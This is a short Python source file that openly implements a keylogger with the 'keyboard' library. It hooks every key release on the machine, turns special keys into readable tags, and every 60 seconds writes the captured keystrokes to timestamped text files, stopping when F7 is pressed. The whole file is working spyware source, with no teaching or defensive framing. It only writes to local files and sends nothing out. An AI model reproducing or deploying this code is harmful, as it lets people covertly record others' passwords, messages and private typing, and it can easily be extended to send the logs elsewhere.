import keyboard
from threading import Timer
from datetime import datetime
import sys

class keylogger:
    def __init__(self,interval,report_method="file"):
        self.interval=interval
        self.report_method=report_method
        self.log="" 
        self.start_dt=datetime.now() 
        self.end_dt=datetime.now()

    def callback(self,event):
        name=event.name
        if len(name) > 1:
            if name == "f7":
                self.end()
            elif name == "space":
                name = " "
            elif name =="enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name=name.replace(" ","_")
                name=f"[{name.upper()}]"
        self.log+="\n"
        self.log+=name     

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ","-")
        end_dt_str = str(self.end_dt)[:-7].replace(" ","-")            
        self.filename=f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):  
        with open(f"{self.filename}.txt","w") as f:  
            print(self.log,file=f)
        print(f"[+] Saved {self.filename}.txt")    

    def report(self):
        if self.log:
            self.end_dt=datetime.now()
            self.update_filename()
            if self.report_method == "file":
                self.report_to_file()

            self.start_dt=datetime.now()
        self.log=""
        timer = Timer(interval=self.interval,function=self.report)   
        timer.daemon = True                                             #daemon (dies when main thread dies)
        timer.start()  


    def start(self):
        self.start_dt=datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

    def end(self):
        self.report()
        sys.exit()    

if __name__ == "__main__":
    Keylogger =    keylogger(interval=60,report_method="file")
    Keylogger.start() 
